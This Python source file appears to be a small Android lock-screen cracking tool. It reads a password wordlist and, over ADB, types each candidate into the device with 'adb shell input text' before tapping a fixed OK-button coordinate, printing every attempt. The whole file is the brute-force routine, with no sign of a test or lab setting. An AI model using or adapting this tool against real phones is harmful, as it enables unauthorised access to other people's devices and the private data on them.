from .adb import ADB
import os

class adb:
    def __init__(self, pl, ok_btn="356 662", **kwargs):
        self.pl_path = pl
        self.pl = open(pl, 'r').read()
        self.a = ADB()
        self.ok_btn = ok_btn

    def clear(self):
        os.system("clear")
        print(f"pl path: {self.pl_path}\nok button:{self.ok_btn}")

    def crack(self):
        self.a.StartServer()
        for i in self.pl.split():
            self.clear()
            print(f"\n[*] password: {i}")
            try:
                self.a.adb(f'adb shell input text {i}')
                self.a.adb('adb shell input tap', self.ok_btn)
            except:
                raise RuntimeError('Failed to connect !')